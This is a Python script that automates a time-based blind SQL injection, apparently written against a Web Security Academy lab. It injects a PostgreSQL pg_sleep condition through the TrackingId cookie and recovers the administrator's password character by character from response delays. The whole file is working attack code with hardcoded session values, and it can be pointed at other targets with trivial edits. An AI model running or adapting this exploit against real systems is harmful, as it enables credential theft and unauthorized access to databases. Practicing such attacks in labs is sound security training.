import requests
import sys
import urllib.parse


url="https://0aa1008204f5132f80f93a2d00960020.web-security-academy.net/"

passwd=""
for l in range(1,21):
    for asc in range(32,127):

        payload = f"' || (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator' LIMIT 1), {l}, 1)) = {asc}) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- "
        
        encode_pay=urllib.parse.quote(payload)
        cookie={
            "TrackingId":"4Tz829AGCPnw9TOt"+ encode_pay,
            "session":"DJz56EE4FhO8vC3IUDugiwzoMCkWASEl"
        }

        resp=requests.get(url=url,cookies=cookie)
        if resp.elapsed.total_seconds() >= 4:
            passwd+=chr(asc)
            sys.stdout.write(f"\rTrying: {passwd}")
            sys.stdout.flush()
            break
        else:

            sys.stdout.write(f"\rTrying: {passwd}{chr(asc)}")
            sys.stdout.flush()

print(f"\nFound passwd: {passwd}")
 



 
